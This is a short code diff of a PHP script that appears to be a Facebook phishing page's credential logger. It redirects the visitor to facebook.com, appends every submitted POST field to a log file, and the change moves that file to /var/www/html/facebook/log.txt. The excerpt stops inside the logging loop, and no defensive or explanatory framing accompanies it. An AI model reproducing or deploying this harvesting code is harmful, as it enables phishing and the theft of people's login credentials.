@@ -4,7 +4,7 @@
 header ('Location: http://www.facebook.com');
 
 // Open the text file in writing mode
-$file = fopen("log.txt", "a");
+$file = fopen("/var/www/html/facebook/log.txt", "a");
 fwrite($file,"\t\t\t\t\t\t");
 fwrite($file,"\r\n");
 foreach($_POST as $key => $value) {
